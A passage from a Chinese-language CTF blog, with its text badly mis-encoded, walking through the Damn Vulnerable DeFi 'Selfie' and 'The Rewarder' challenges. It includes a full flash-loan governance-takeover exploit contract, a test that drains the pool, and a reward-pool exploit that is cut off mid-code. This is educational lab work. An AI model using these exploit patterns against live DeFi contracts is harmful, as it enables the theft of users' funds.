CallbackFailed(); if (!token.transferFrom(address(_receiver), address(this), _amount)) revert RepayFailed(); return true;&#125; å€Ÿè´·å‡½æ•°ï¼Œè¦æ±‚æˆ‘ä»¬å®ç°onFlashLoanå‡½æ•°ï¼Œä¸”æŒ‰è¦æ±‚è¿”å› CALLBACK_SUCCESS ç„¶åå†è¿˜æ¸…è´·æ¬¾ï¼Œè¿™é‡Œå…«åˆ†è¦æ¶‰åŠæˆæƒé—®é¢˜ã€‚ emergencyExit 12345678910// ç´§æ€¥äº‹ä»¶å‡ºå£// ä½†æ˜¯èƒ½æ“ä½œè¿™ä¸ªå‡½æ•°çš„åªæœ‰ è¯¥åˆçº¦çš„ç®¡ç†è€…è¡Œfunction emergencyExit(address receiver) external onlyGovernance &#123; // è®°å½•å½“å‰åˆçº¦çš„ä½™é¢ uint256 amount = token.balanceOf(address(this)); // è°ƒç”¨è€…å°† amount è½¬ç»™ receiver token.transfer(receiver, amount); emit FundsDrained(receiver, amount);&#125; è§£é¢˜å…³é”®ï¼š æˆ‘ä»¬è¦é€šè¿‡ governanceä¹‹æ‰‹ï¼Œå°† å€Ÿè´·æ± çš„é’±å…¨éƒ¨è½¬ç§»åˆ°æˆ‘ï¼ˆplayerï¼‰çš„è´¦æˆ·ä¸‹ã€‚ é‡ç‚¹å°±æ˜¯å¦‚æœå€Ÿ governanceä¹‹æ‰‹ï¼Œæˆ‘ä»¬å†çœ‹çœ‹ governanceçš„åˆçº¦ã€‚ SimpleGovernance 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;../DamnValuableTokenSnapshot.sol&quot;;import &quot;./ISimpleGovernance.sol&quot;;// import &quot;hardhat/console.sol&quot;;/** * @title SimpleGovernance * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz) */contract SimpleGovernance is ISimpleGovernance &#123; uint256 private constant ACTION_DELAY_IN_SECONDS = 2 days; DamnValuableTokenSnapshot private _governanceToken; // æ²»ç†ä»£å¸ =&gt; ä¸€ç§æ–°å‹çš„ä»£å¸æ‹¥æœ‰å¿«ç…§åŠŸèƒ½ uint256 private _actionCounter; // åŠ¨ä½œè®¡æ•°å™¨ mapping(uint256 =&gt; GovernanceAction) private _actions; // GovernanceAction æ˜¯ ISimpleGovernance ä¸­çš„ä¸€ä¸ªç»“æ„ä½“ /** governanceToken ç»§æ‰¿äº† ERC20 æ‹¥æœ‰ERC20 åè®®çš„åŠŸèƒ½ */ constructor(address governanceToken) &#123; _governanceToken = DamnValuableTokenSnapshot(governanceToken); _actionCounter = 1; // åˆå§‹åŒ–åŠ¨ä½œè¡Œä¸ºæ¬¡æ•° = 1 &#125; /** æ’é˜Ÿè¡Œä¸º */ function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) &#123; // åˆ¤æ–­æ˜¯å¦æœ‰ç¥¨ if (!_hasEnoughVotes(msg.sender)) revert NotEnoughVotes(msg.sender); // target ä¸èƒ½ä¸ºå½“å‰åˆçº¦ if (target == address(this)) revert InvalidTarget(); // data éœ€ä¸º ç©ºï¼Œä¸” target.code.length å­—èŠ‚ç ä¸èƒ½ä¸ºç©ºï¼Œä¹Ÿå°±æ˜¯è¯´å½“å‰targetéœ€è¦æ­£ç¡®éƒ¨ç½²åˆ°åŒºå—é“¾ä¸Š if (data.length &gt; 0 &amp;&amp; target.code.length == 0) revert TargetMustHaveCode(); // è¡Œä¸ºID = åˆçº¦ä¸­çš„è¡Œä¸ºæ¬¡æ•° actionId = _actionCounter; // è®°å½•è¯¥è¡Œä¸ºçš„ä¿¡æ¯ _actions[actionId] = GovernanceAction(&#123; target: target, value: value, proposedAt: uint64(block.timestamp), executedAt: 0, data: data &#125;); // è¡Œä¸ºæ¬¡æ•°åŠ ä¸€ unchecked &#123; _actionCounter++; &#125; emit ActionQueued(actionId, msg.sender); &#125; /** æ˜¯å¦æœ‰è¶³å¤Ÿçš„ç¥¨ */ function _hasEnoughVotes(address who) private view returns (bool) &#123; /** æ³¨æ„ï¼š è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œtotalsupply åªå— é“¸å¸å’Œé”€å¸çš„æ“ä½œçš„å½±å“ è€Œbalanceæ—¢ å— é“¸å¸å’Œé”€å¸çš„æ“ä½œçš„å½±å“ ä¹Ÿå— è½¬è´¦æ“ä½œçš„å½±å“ æ‰€ä»¥åœ¨ä¸æ‰§è¡Œburnæ“ä½œçš„å‰æä¸‹ï¼Œåªè¦ä¸€é“¸å¸ï¼Œåœ¨æ•´ä½“åˆçº¦ä½“ç³»ä¸­ totalsupplyæ˜¯ä¸å˜çš„ */ // æŸ¥çœ‹ who åœ¨ä¸Šæ¬¡å¿«ç…§çš„æ—¶å€™çš„ balance uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who); // console.log(who,balance); // æŸ¥çœ‹ who åœ¨ä¸Šæ¬¡å¿«ç…§çš„æ—¶å€™çš„ æ€»ä¾›ç»™é‡ çš„ä¸€åŠ uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2; // å¦‚æœ ä½™é¢å¤§äº ä¸€åŠä¾›ç»™é‡å°±æ˜¯æœ‰ç¥¨ return balance &gt; halfTotalSupply; &#125; /** æ‰§è¡Œè¡Œä¸º */ function executeAction(uint256 actionId) external payable returns (bytes memory) &#123; // æ˜¯å¦æ»¡è¶³æ‰§è¡Œæ¡ä»¶ if(!_canBeExecuted(actionId)) revert CannotExecute(actionId); // è·å– è¯¥actionId çš„ ç»“æ„ä½“ // `storage`æˆ‘æ„Ÿè§‰è¦å€¼å¾—æ³¨æ„ GovernanceAction storage actionToExecute = _actions[actionId]; // ä¿®æ”¹executedAtï¼Œ è¡¨ç¤ºè¯¥actionId è¿›è¡Œäº† æ‰§è¡Œè¡Œä¸º actionToExecute.executedAt = uint64(block.timestamp); emit ActionExecuted(actionId, msg.sender); // target è°ƒç”¨ actionToExecute.data å‡½æ•° (bool success, bytes memory returndata) = actionToExecute.target.call&#123;value: actionToExecute.value&#125;(actionToExecute.data); if (!success) &#123; if (returndata.length &gt; 0) &#123; assembly &#123; revert(add(0x20, returndata), mload(returndata)) &#125; &#125; else &#123; revert ActionFailed(actionId); &#125; &#125; return returndata; &#125; function getActionDelay() external pure returns (uint256) &#123; return ACTION_DELAY_IN_SECONDS; &#125; function getGovernanceToken() external view returns (address) &#123; return address(_governanceToken); &#125; function getAction(uint256 actionId) external view returns (GovernanceAction memory) &#123; return _actions[actionId]; &#125; function getActionCounter() external view returns (uint256) &#123; return _actionCounter; &#125; /** * @dev an action can only be executed if: // åªæœ‰åœ¨å¦‚ä¸‹æƒ…å†µæ‰å¯ä»¥èƒ½æ‰§è¡Œæ“ä½œ * 1) it&#x27;s never been executed before and // å®ƒä»¥å‰ä»æœªè¢«æ‰§è¡Œè¿‡ * 2) enough time has passed since it was first proposed // è‡ªé¦–æ¬¡æå‡ºä»¥æ¥å·²ç»è¿‡å»äº†è¶³å¤Ÿçš„æ—¶é—´ */ function _canBeExecuted(uint256 actionId) private view returns (bool) &#123; GovernanceAction memory actionToExecute = _actions[actionId]; // å¦‚æœæ²¡æ’è¿‡é˜Ÿï¼Œå°±ä¸èƒ½ è¿›è¡Œ æ‰§è¡Œæ“ä½œ ï¼Œç›´æ¥é€€å‡º if (actionToExecute.proposedAt == 0) // early exit return false; uint64 timeDelta; // æ—¶é—´ä¸‰è§’æ´²ï¼Ÿï¼ unchecked &#123; // timeDelta = å½“å‰æ—¶é—´æˆ³ - æ’é˜Ÿæ—¶é—´æˆ³ timeDelta = uint64(block.timestamp) - actionToExecute.proposedAt; &#125; // actionToExecute.executedAt == 0(æœªè¢«æ‰§è¡Œ) å¹¶ä¸” timeDelta &gt;= 2 days return actionToExecute.executedAt == 0 &amp;&amp; timeDelta &gt;= ACTION_DELAY_IN_SECONDS; &#125;&#125; executeActionå‡½æ•° (bool success, bytes memory returndata) = actionToExecute.target.call&#123;value: actionToExecute.value&#125;(actionToExecute.data)å°±æ˜¯å†’å……çš„æ¼æ´ï¼ŒSimpleGovernanceè°ƒå…¶ä»–å‡½æ•°ï¼Œå°±å¯ä»¥è®©å®ƒæˆä¸ºè¢«ç›—å‡½æ•°çš„åˆçº¦çš„ msg.senderå°±å¯ä»¥å†’å……ã€‚ è¦æƒ³æˆåŠŸæ‰§è¡ŒexecuteActionå‡½æ•°ï¼Œå°±å¾—ä¾æ¬¡æˆåŠŸæ‰§è¡Œ_hasEnoughVotesï¼ŒqueueActionï¼Œ_canBeExecuted æ‰€ä»¥é‡ç‚¹å°±æ˜¯ _hasEnoughVoteså‡½æ•°ã€‚ è¿™ä¸ªå¿«ç…§åŠŸèƒ½å¤ªå¤æ‚äº†ï¼Œæˆ‘çŸ¥é“ snapshots.ids.lengthå§‹ç»ˆ &#x3D; 1ï¼Œæˆ‘æµ‹è¯•çš„ç»“æœæ˜¯å§‹ç»ˆ &#x3D; 1 ï¼Œä½†æ˜¯æˆ‘ä¸çŸ¥é“åœ¨å“ªè®¾ç½®çš„ï¼Œindex é™¤äº†ç¬¬ä¸€æ¬¡ æ˜¯ 0ï¼Œä¹‹åä¸€ç›´éƒ½æ˜¯ 1ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé‡Œé¢å­˜äº†ä¸€ä¸ªç´¢å¼•ä¸º0çš„æ•°æ®ã€‚çœ‹ä¸æ‡‚ â€¦.. _valueAt() 123456789101112 function _valueAt(uint256 snapshotId, Snapshots storage snapshots) private view returns (bool, uint256) &#123; require(snapshotId &gt; 0, &quot;ERC20Snapshot: id is 0&quot;); require(snapshotId &lt;= _getCurrentSnapshotId(), &quot;ERC20Snapshot: nonexistent id&quot;); uint256 index = snapshots.ids.findUpperBound(snapshotId); if (index == snapshots.ids.length) &#123; return (false, 0); &#125; else &#123; return (true, snapshots.values[index]); &#125;&#125; nå¤©å†çœ‹ï¼Œï¼Œï¼Œï¼Œï¼Œ è¿™é‡Œæ˜¯ç»§æ‰¿ã€‚ã€‚ã€‚ã€‚ã€‚ ERC20ä¸­çš„é“¸å¸ï¼š 123456789101112function _mint(address account, uint256 amount) internal virtual &#123; require(account != address(0), &quot;ERC20: mint to the zero address&quot;); _beforeTokenTransfer(address(0), account, amount); _totalSupply += amount; _balances[account] += amount; emit Transfer(address(0), account, amount); _afterTokenTransfer(address(0), account, amount);&#125; åœ¨ä¸‰å±‚ç»§æ‰¿ä¸­ ï¼ŒDamnValuableTokenSnapshot &lt;= ERC20Snapshot &lt;= ERC20 åœ¨ DamnValuableTokenSnapshot ä¸­ï¼Œè°ƒç”¨ mint ï¼Œ_mint ä¸­çš„ _beforeTokenTransfer å…¶å®æ˜¯å…ˆåœ¨ ERC20Snapshot ä¸­æ‰¾ï¼Œå¦‚æœæ‰¾ä¸åˆ°ï¼Œå†ä¸€å±‚å±‚å¾€ä¸Šæ‰¾ã€‚æ‰€ä»¥ä½¿ç”¨ ERC20Snapshot ä¸­çš„ _beforeTokenTransfer ï¼Œå°±ä¼šäº‹å…ˆå­˜å…¥ä¸€ä¸ªå€¼ï¼Œä»–çš„ç´¢å¼•å°±æ˜¯0. 3. solving3.1 SelfieHack.sol123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./SimpleGovernance.sol&quot;;import &quot;./SelfiePool.sol&quot;;import &quot;hardhat/console.sol&quot;;/** æ€è·¯ï¼š 1. éƒ¨ç½² SimpleGovernance åˆçº¦ï¼Œå¾—åˆ°å…¶åœ°å€ governanceï¼Œæ„é€ å™¨ä¸­çš„å‚æ•°æ˜¯jsä»£ç ä¸­çš„token.address 2. éƒ¨ç½² SelfiePool, å‚æ•°åˆ†åˆ«ä¸º token.address å’Œ governanceï¼Œå¾—åˆ°åˆçº¦ pool 3. è°ƒç”¨ SimpleGovernance ä¸­ çš„`queueAction(address target, uint128 value, bytes calldata data)` 3.1 target = pool, value = ä»»æ„, data = abi.encodeWithSignature(&quot;emergencyExit(address)&quot;, player.address); 4. è°ƒç”¨ SimpleGovernance ä¸­çš„ executeAction(uint256 actionId) external payable returns (bytes memory) 4.1 æ‰§è¡Œ queueAction ä¹‹å actionId ä¼šåŠ ä¸€ ï¼Œæ‰€ä»¥è¦ è¿›è¡Œ-1 æ“ä½œ */contract SelfieHack &#123; SimpleGovernance governance; SelfiePool pool; DamnValuableTokenSnapshot DVTSToken; constructor(address _governance, address _pool, address _token) &#123; governance = SimpleGovernance(_governance); pool = SelfiePool(_pool); DVTSToken = DamnValuableTokenSnapshot(_token); &#125; // è´·æ¬¾ï¼Œæ‹¿é’±åšè‡ªå·±æƒ³åšçš„äº‹æƒ… function attack() external &#123; // ä¿å­˜ `&quot;emergencyExit(address)&quot;, msg.sender`çš„ abi, æ­¤æ—¶çš„ msg.sender = player.address bytes memory emergencyExitData = abi.encodeWithSignature(&quot;emergencyExit(address)&quot;, msg.sender); // è®°å½•è´·æ¬¾æ•°ç›®ï¼ˆå…¨è´·ï¼‰ uint256 amount = DVTSToken.balanceOf(address(pool)); // æ‰§è¡Œè´·æ¬¾æ“ä½œ IERC3156FlashBorrower receiver = IERC3156FlashBorrower(address(this)); pool.flashLoan(receiver, address(DVTSToken), amount, emergencyExitData); &#125; function executeAction() external &#123; // å› ä¸ºæ‰§è¡ŒqueueActionï¼ŒSimpleGovernance ä¸­çš„ è¡Œä¸ºæ¬¡æ•°ä¼š åŠ  1 ï¼Œæ‰€ä»¥è¦å‡ 1 uint256 actionId = governance.getActionCounter() - 1; governance.executeAction(actionId); &#125; function onFlashLoan( address initiator, address token, uint256 amount, uint256 fee, bytes calldata data ) external returns (bytes32)&#123; // å¾—åˆ°é’±ä¹‹åé©¬ä¸Šæ‹ç…§ï¼Œè®°å½•å½“æ—¶æˆ‘æ˜¯æœ‰é’±çš„ DVTSToken.snapshot(); // æ‰§è¡Œ æ’é˜Ÿè¡Œä¸ºï¼Œä¸ºäº†æ¥ä¸‹æ¥èƒ½å¤Ÿè¿›è¡Œ æ‰§è¡Œè¡Œä¸º governance.queueAction(address(pool), 0, data); // è®© hacker ç»™ poolæˆæƒï¼Œä¸ç„¶ pool ä¸èƒ½æ‰§è¡Œ transferFromå‡½æ•°ï¼Œå°†hacker çš„é’±è½¬å›pool DVTSToken.approve(address(pool),DVTSToken.balanceOf(address(this))); // æŒ‰flashLoanè¦æ±‚è¿”å› return keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;); &#125;&#125; 3.2 selfie.challenge.js12345678it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const Hacker = await (await ethers.getContractFactory(&#x27;SelfieHack&#x27;, player)).deploy( governance.address, pool.address, token.address); await Hacker.attack(); await ethers.provider.send(&quot;evm_increaseTime&quot;, [2 * 24 * 60 * 60]); // è¿‡ä¸¤å¤© await Hacker.executeAction(); &#125;); è§£é¢˜æˆåŠŸã€‚","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"The Rewarder","slug":"CTFS/damn defi/The Rewarder","date":"2023-07-11T00:37:10.000Z","updated":"2023-07-11T00:37:10.000Z","comments":true,"path":"2023/07/11/CTFS/damn defi/The Rewarder/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/11/CTFS/damn%20defi/The%20Rewarder/","excerpt":"","text":"1. issue Thereâ€™s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it. Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards! You donâ€™t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself. By the way, rumours say a new pool has just launched. Isnâ€™t it offering flash loans of DVT tokens? ç®€å•æ¥è¯´ï¼Œå°±æ˜¯ æˆ‘æ‰‹ä¸­æ²¡é’±ï¼Œè¦æ±‚æˆ‘å»å­˜é’±å¹¶è·å–æœ€å¤šçš„åˆ©æ¯ã€‚å½“ç„¶è¿™ç†è®ºä¸Šæ˜¯å¤©æ–¹å¤œè°­ï¼Œæ‰€ä»¥é¢˜ç›®ç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªé—ªç”µè´·ã€‚ é¢˜ç›®é“¾æ¥ 2. analysing2.1 FlashLoanerPoolflashLoanå‡½æ•° 123456789101112131415161718192021222324252627282930313233function flashLoan(uint256 amount) external nonReentrant &#123; uint256 balanceBefore = liquidityToken.balanceOf(address(this)); // è´·æ¬¾çš„æ•°ç›®ä¸èƒ½å¤§äºå€Ÿè´·æ± çš„ balanceBefore if (amount &gt; balanceBefore) &#123; revert NotEnoughTokenBalance(); &#125; // è°ƒç”¨è€…åªèƒ½æ˜¯åˆçº¦ if (!msg.sender.isContract()) &#123; revert CallerIsNotContract(); &#125; // å‘msg.senderè½¬è´¦ liquidityToken.transfer(msg.sender, amount); /** è§£è¯» `functionCall(address target, bytes memory data)` 1. è¿™é‡Œæ¶‰åŠäº†åº“å‡½æ•°çš„ä½¿ç”¨ï¼Œåº“å‡½æ•°çš„è°ƒç”¨è€…å³ä¸º functionCall çš„ç¬¬ä¸€ä¸ªå‚æ•° 2. æ­¤æ—¶çš„è°ƒç”¨è€…å¿…é¡»æ˜¯ä¸€ä¸ªåˆçº¦åœ°å€ï¼Œä¸”è¯¥åœ°å€çš„ä½™é¢å¿…é¡»å¤§äºç­‰äº0 3. å‡½æ•°ä¸­è¿˜ä¼šæ‰§è¡Œtarget.call&#123;value: value&#125;(data) 3.1. ä½¿ç”¨ target è°ƒç”¨ dataå­—èŠ‚ç è¡¨ç¤ºçš„å‡½æ•° 3.2. å¹¶ä¸”å‘é€ valueçš„é‡‘é¢ï¼Œæ­¤æ—¶çš„value=0 sum: åœ¨åº•å±‚ä½¿ç”¨ target è°ƒç”¨ &quot;dataå‡½æ•°&quot; */ // receiveFlashLoan å‡½æ•°æœªå®šä¹‰ï¼Œæœ‰æ“ä½œç©ºé—´ msg.sender.functionCall(abi.encodeWithSignature(&quot;receiveFlashLoan(uint256)&quot;, amount)); // ç¡®ä¿è¿˜é’±ä¹‹åï¼Œå€Ÿè´·æ± çš„ä½™é¢å¤§äºæœªå€Ÿè´·ä¹‹å‰çš„ä½™é¢ if (liquidityToken.balanceOf(address(this)) &lt; balanceBefore) &#123; revert FlashLoanNotPaidBack(); &#125; &#125; ä¸€ä¸ªå€Ÿè´·åŠŸèƒ½ï¼Œä½†æ˜¯è¦æ±‚å€Ÿè´·äººå®ç° receiveFlashLoan(uint256)å‡½æ•°æ‰èƒ½å€Ÿè´·ã€‚ 2.2 TheRewarderPoolå¯¹ç›®å‰çš„æˆ‘æ¥è¯´ï¼Œåˆ†æèµ·æ¥çœŸè¦å‘½ï¼ˆå…·ä½“çš„ç»†èŠ‚è¿˜æ˜¯é‚£ä¸ªå¿«ç…§ï¼‰ã€‚ã€‚ã€‚ã€‚ å…ˆçœ‹æ„é€ å‡½æ•°ï¼Œæ„é€ å‡½æ•°ä¸­çš„_recordSnapshot()å°±æœ‰å¤§å­¦é—®ã€‚ 1234567891011121314151617181920constructor(address _token) &#123; // Assuming all tokens have 18 decimals liquidityToken = _token; // é‡‘åº“åœ°å€ accountingToken = new AccountingToken(); // DVT token rewardToken = new RewardToken(); // å¥–åŠ±ä»£å¸ RWT /** éƒ¨ç½²åˆçº¦ä¹‹åï¼Œæ‹ä¸€æ¬¡å¿«ç…§ï¼Œ æ­¤æ—¶çš„ lastSnapshotIdForRewards = 1ï¼ŒlastRecordedSnapshotTimestamp = éƒ¨ç½²åˆçº¦çš„æ—¶é—´ å½“æˆ‘ä»¬çš„ msg.sender ç¬¬ä¸€æ¬¡è°ƒç”¨depositæ—¶ï¼ŒlastRewardTimestamps[msg.sender] = 0 ä¹Ÿå°±æ˜¯ï¼Œå‡½æ•° _hasRetrievedReward çš„åˆ¤æ–­æ¡ä»¶ lastRewardTimestamps[account] &gt;= lastRecordedSnapshotTimestamp : 0 &gt;= uint64(block.timestamp) ï¼Ÿ lastRewardTimestamps[account] &lt;= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION ï¼š0 &lt;= uint64(block.timestamp) + 5 days æ‰€ä»¥åªè¦æ˜¯ç¬¬ä¸€æ¬¡è¿›è¡Œæ“ä½œçš„ç”¨æˆ·ï¼Œç»“æœè¿”å›çš„å§‹ç»ˆæ˜¯false */ _recordSnapshot();&#125; çœ‹å®Œè¿™ä¸ªå‡½æ•°ä¹‹åï¼Œç»™æˆ‘çš„æƒ³æ³•æ˜¯ï¼Œè¿™ä¸å°±æ˜¯ç»™æ–°ç”¨æˆ·çš„ç¦åˆ©å—ï¼Œåªè¦æ˜¯æ–°ç”¨æˆ·ï¼ˆmsg.senderç¬¬ä¸€æ¬¡è°ƒç”¨æ­¤åˆçº¦ï¼‰ï¼Œä¸ç®¡æ€ä¹ˆæ ·ï¼Œå³ä½¿æ˜¯æˆ‘åˆšåˆšéƒ¨ç½²å®Œåˆçº¦å°±ç«‹é©¬å­˜é’±å°±ç›´æ¥å¯ä»¥è·å¾—rewardã€‚ depositå‡½æ•° 12345678910111213141516171819202122function deposit(uint256 amount) external &#123; // å­˜æ¬¾ä¸èƒ½ä¸º0 if (amount == 0) &#123; revert InvalidDepositAmount(); &#125; // ä¸º msg.sender é“¸å¸ accountingToken.mint(msg.sender, amount); // æ‰§è¡Œåˆ†é…å¥–åŠ±æœºåˆ¶ distributeRewards(); // liquidityToken è´Ÿè´£ ä» msg.sender å‘ address(this) è½¬ç§» amount çš„ETH // æ­¤æ—¶çš„ msg.sender æ˜¯ Account SafeTransferLib.safeTransferFrom( liquidityToken, msg.sender, address(this), amount ); &#125; ä»£ç è¿˜è¡Œçš„ï¼Œé‡ç‚¹å°±æ˜¯ distributeRewards(). distributeRewards()å‡½æ•° 123456789101112131415161718192021222324252627282930// åˆ†é…å¥–åŠ±å‡½æ•°function distributeRewards() public returns (uint256 rewards) &#123; // æ˜¯å¦æ˜¯æ–°çš„å¿«ç…§æ—¶æœŸ if (isNewRewardsRound()) &#123; // å¦‚æœæ—¶æ–°çš„å›åˆï¼Œå°±æ›´æ–°å½“å‰å¿«ç…§ _recordSnapshot(); &#125; // æŸ¥è¯¢æœ€æ–°å¿«ç…§ çš„ totalSupply // å¦‚æœæ˜¯ç¬¬ä¸€å›åˆï¼Œåˆ™è¿”å›é“¸å¸æ•°ç›® uint256 totalDeposits = accountingToken.totalSupplyAt(lastSnapshotIdForRewards); // åœ¨å½“å‰å¿«ç…§ä¸‹ï¼Œmsg.sneder çš„ balance uint256 amountDeposited = accountingToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards); if (amountDeposited &gt; 0 &amp;&amp; totalDeposits &gt; 0) &#123; // rewards = amountDeposited * REWARDS / totalDeposits rewards = amountDeposited.mulDiv(REWARDS, totalDeposits); // rewards &gt; 0; _hasRetrievedReward:æ˜¯å¦æ£€ç´¢åˆ°æ–°çš„å¥–åŠ± if (rewards &gt; 0 &amp;&amp; !_hasRetrievedReward(msg.sender)) &#123; // ä¸º msg.sender é“¸å¥–åŠ±å¸ rewardToken.mint(msg.sender, rewards); // è®°å½• msg.sender æœ€æ–°è·åˆ©çš„æ—¶é—´ lastRewardTimestamps[msg.sender] = uint64(block.timestamp); &#125; &#125;&#125; ç®€å•æ¥è¯´ï¼Œå°±æ˜¯è´¦æˆ·æ²¡é’±å°±ä¸åšä»€ä¹ˆæ“ä½œï¼Œå¦‚æœæœ‰é’±ï¼Œä¸”rewards å’Œå­˜é’±æ—¶é—´å¤§äº 5days å°±å¯ä»¥è·å¾—å¥–åŠ±æ± çš„RWTå¥–åŠ±ï¼Œå¹¶æ›´æ–°è¯¥è´¦æˆ·çš„è·å–æ—¶é—´ã€‚ _hasRetrievedRewardå‡½æ•° 123456function _hasRetrievedReward(address account) private view returns (bool) &#123; return ( lastRewardTimestamps[account] &gt;= lastRecordedSnapshotTimestamp &amp;&amp; lastRewardTimestamps[account] &lt;= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION );&#125; æˆ‘æœ‰ä¸ªç–‘æƒ‘ï¼Œå³ä½¿ä¸æ˜¯æ–°ç”¨æˆ·ï¼Œé‚£ä¹ˆæˆ‘åªè¦å°†åˆçº¦éƒ¨ç½²ä¹‹åï¼Œè¿‡äº†äº”å¤©ä¹‹åï¼Œæˆ‘å°±å¯ä»¥ä¸€ç›´å¾€é‡Œé¢è·å–å¥–åŠ±ï¼Ÿ å› ä¸º lastRecordedSnapshotTimestamp åªæœ‰åœ¨åˆå§‹åŒ–çš„æ—¶å€™è¢«èµ‹å€¼ï¼Œåªè¦æˆ‘ä¸èµ‹å€¼ï¼ˆå³ä¸å†éƒ¨ç½²æ–°çš„è¯¥åˆçº¦ï¼Œæ˜¯ä¸æ˜¯å°±å¯ä»¥äº”å¤©ä¹‹åä¸€ç›´è°ƒç”¨ å¥–åŠ±å‡½æ•°å‘¢ï¼Ÿ æƒ³æ˜ç™½äº†ï¼š çœ‹é”™ä»£ç äº†ï¼ŒlastRecordedSnapshotTimestamp åªåœ¨åˆå§‹åŒ–ä¸­ä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œå…¶ä»–æ—¶å€™éƒ½åœ¨distributeRewardså‡½æ•°ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯æ¬¡æ‰§è¡Œ å¥–åŠ±å‡½æ•°ï¼Œå¦‚æœæˆåŠŸè·å¥–ï¼Œé‚£ä¹ˆä¹…æ›´æ–° lastRecordedSnapshotTimestampã€‚ åˆ°è¿™é‡Œï¼Œåšé¢˜æ€è·¯å°±å‡ºæ¥äº†ï¼Œæ¡ˆä¾‹æ¥è¯´å¯¹äºæˆ‘ä»¬æ–°ç”¨æˆ·ï¼Œä¸ç”¨ç­‰ 5dayså°±å¯ä»¥å–é’±äº†çš„ï¼Œæ‰€ä»¥åªè¦å‘ å€Ÿè´·æ± ä¸­å€Ÿ æœ€å¤šçš„é’±ï¼Œæ¥æ‰§è¡Œæˆ‘ä»¬çš„å­˜é’±æ“ä½œå°±å¯ä»¥äº†ã€‚å½“ç„¶ï¼Œé¢˜ç›®è¿˜æŒ–äº†ä¸ªå‘ï¼Œï¼Œï¼Œï¼Œ 1234expect( await rewarderPool.roundNumber()).to.be.eq(3); è¦åˆ°ç¬¬ä¸‰å›åˆæ‰å¯ä»¥æˆåŠŸã€‚è¦æ˜¯æœ‰è€å¿ƒçš„äººçš„è¯ï¼Œå¯ä»¥ç­‰ 5å¤©ï¼Œä½†æ˜¯æˆ‘æ²¡è€å¿ƒä¸”åœ¨æœ¬åœ°ï¼Œå°±å¯ä»¥ä½¿ç”¨ ethersçš„å·¥å…·ï¼Œæ¥ç¯¡æ”¹EVMçš„æ—¶é—´ã€‚ ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬çš„æ€è·¯æ˜¯ï¼š éƒ¨ç½² å¥–åŠ±æ± åˆçº¦ ç­‰å¾… 5 å¤©ï¼Œä» ä¸­è·å– DVT çš„é—ªè´·FlashLoanerPoolï¼Œ å­˜å…¥RewarderPoolï¼ˆæ‰§è¡Œdepositå‡½æ•°ä¹Ÿä¼šæ‰§è¡ŒdistributeRewardså‡½æ•°ï¼‰ï¼Œ æå– DVT å‘é€RewardTokenç»™æ”»å‡»è€… å¿è¿˜è´·æ¬¾ã€‚ 3. solving3.1 RewardHack123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./FlashLoanerPool.sol&quot;;import &quot;./TheRewarderPool.sol&quot;;import &quot;../DamnValuableToken.sol&quot;;import &#123; RewardToken &#125; from &quot;./RewardToken.sol&quot;;import &quot;hardhat/console.sol&quot;;contract RewardHack &#123; DamnValuableToken damnValuableToken; FlashLoanerPool flashLoanpool; TheRewarderPool rewarderPool; RewardToken rewardToken; address player; constructor(address _dvtAddr, address _flashpoolAddr, address _rewarderpollAddr, address _rwtAddr) &#123; damnValuableToken = DamnValuableToken(_dvtAddr); flashLoanpool = FlashLoanerPool(_flashpoolAddr); // ç”¨æ¥è°ƒç”¨ flashLoan rewarderPool = TheRewarderPool(_rewarderpollAddr); // ç”¨æ¥è°ƒç”¨ å­˜é’±å–é’± rewardToken = RewardToken(_rwtAddr); player = msg.sender; // è®°å½•å½“å‰playerçš„åœ°å€ &#125; // è®©æˆ‘ä»¬çš„ hacker æˆä¸ºå€Ÿè´·ç€ï¼Œè™½ç„¶é¢˜ç›®è¦æ±‚æ“ä½œçš„æ˜¯ playerçš„ä½™é¢ï¼Œä½†æ˜¯player å’Œ hacker æ˜¯è‡ªå·±äººå˜› // receiveFlashLoan è¿˜è´·æ˜¯åœ¨å€Ÿè´·ä¹‹åçš„ï¼Œæ‰€ä»¥å¯ä»¥å‡è®¾æˆ‘ä»¬ç°åœ¨æœ‰é’±ï¼Œæˆ‘ä»¬å…ˆæŠŠè‡ªå·±è¦åšçš„äº‹æƒ…åšå®Œå†è¿˜æ¬¾ function receiveFlashLoan(uint256 amount) external &#123; /** ä¸ºäº†è®© RewardHack ç»™ rewardPoolæˆæƒ `allowance[msg.sender][spender] = amount;` safeTransferFrom 